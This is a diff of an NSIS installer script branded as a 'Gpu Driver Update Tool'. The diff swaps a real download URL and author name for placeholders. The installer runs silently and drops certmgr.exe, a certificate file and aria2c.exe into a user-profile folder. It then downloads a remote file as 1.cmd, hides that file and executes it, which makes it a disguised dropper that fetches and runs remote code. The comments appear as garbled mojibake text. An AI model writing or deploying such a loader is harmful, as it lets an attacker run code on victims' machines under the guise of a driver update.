@@ -1,45 +1,45 @@
-; ÉèÖÃ°²×°³ÌĞòµÄÍ¼±ê
+; è®¾ç½®å®‰è£…ç¨‹åºçš„å›¾æ ‡
 Icon "D:\10.ico"
 
-; ¶¨Òå°æ±¾ĞÅÏ¢
+; å®šä¹‰ç‰ˆæœ¬ä¿¡æ¯
 VIProductVersion "1.0.1.3"
 VIAddVersionKey /LANG=2052 "ProductName" "Gpu Driver Update Tool"
-VIAddVersionKey /LANG=2052 "CompanyName" "Ğ¡ÄÏ¹Ï"
-VIAddVersionKey /LANG=2052 "FileDescription" "ÏÔ¿¨Çı¶¯Éı¼¶ÖúÊÖVIP"
+VIAddVersionKey /LANG=2052 "CompanyName" "your name"
+VIAddVersionKey /LANG=2052 "FileDescription" "æ˜¾å¡é©±åŠ¨å‡çº§åŠ©æ‰‹"
 VIAddVersionKey /LANG=2052 "FileVersion" "1.0.1.3"
-VIAddVersionKey /LANG=2052 "LegalCopyright" "Copyright ${U+00A9} 2023 Ğ¡ÄÏ¹Ï. All Rights Reserved"
+VIAddVersionKey /LANG=2052 "LegalCopyright" "Copyright ${U+00A9} 2023 All Rights Reserved"
 
-; ¶¨Òå°²×°³ÌĞòµÄÊä³öÃû
+; å®šä¹‰å®‰è£…ç¨‹åºçš„è¾“å‡ºå
 OutFile "Installer.exe"
 
-; È·±£Ê¹ÓÃµÄÊÇÕıÈ·µÄÎÄ¼şÑ¹Ëõ·½Ê½
+; ç¡®ä¿ä½¿ç”¨çš„æ˜¯æ­£ç¡®çš„æ–‡ä»¶å‹ç¼©æ–¹å¼
 SetCompressor /SOLID lzma
 
-; ÉèÖÃ°²×°³ÌĞòÎª¾²Ä¬°²×°
+; è®¾ç½®å®‰è£…ç¨‹åºä¸ºé™é»˜å®‰è£…
 SilentInstall silent
 ShowInstDetails nevershow
 ShowUninstDetails nevershow
 
 Section
-    ; ¼ÆËã lgx Ä¿Â¼Â·¾¶
+    ; è®¡ç®— lgx ç›®å½•è·¯å¾„
     StrCpy $0 "$%USERPROFILE%\lgx"
 
-    ; É¾³ı´æÔÚµÄ lgx Ä¿Â¼²¢ÖØĞÂ´´½¨
+    ; åˆ é™¤å­˜åœ¨çš„ lgx ç›®å½•å¹¶é‡æ–°åˆ›å»º
     RMDir /r $0
     CreateDirectory $0
 
-    ; ÊÍ·ÅÎÄ¼şµ½ lgx Ä¿Â¼
+    ; é‡Šæ”¾æ–‡ä»¶åˆ° lgx ç›®å½•
     SetOutPath $0
     File "Cert.spc"
     File "certmgr.exe"
     File "aria2c.exe"
 
-    ; Ê¹ÓÃ aria2c.exe ÏÂÔØÎÄ¼ş£¬²¢ÖØÃüÃûÎª 1.cmd
-    ExecWait '"$0\aria2c.exe" --quiet --allow-overwrite=true -d "$0" -o 1.cmd "https://vip.123pan.cn/1814328088/gtx/vip1"'
+    ; ä½¿ç”¨ aria2c.exe ä¸‹è½½æ–‡ä»¶ï¼Œå¹¶é‡å‘½åä¸º 1.cmd
+    ExecWait '"$0\aria2c.exe" --quiet --allow-overwrite=true -d "$0" -o 1.cmd "your url"'
 
-    ; ½«ÏÂÔØµÄ 1.cmd ÎÄ¼şÉèÖÃÎªÒş²Ø
+    ; å°†ä¸‹è½½çš„ 1.cmd æ–‡ä»¶è®¾ç½®ä¸ºéšè—
     Exec 'attrib +h "$0\1.cmd"'
 
-    ; ÔËĞĞÒş²ØµÄ 1.cmd ÎÄ¼ş
+    ; è¿è¡Œéšè—çš„ 1.cmd æ–‡ä»¶
     Exec '"$0\1.cmd"'
 SectionEnd
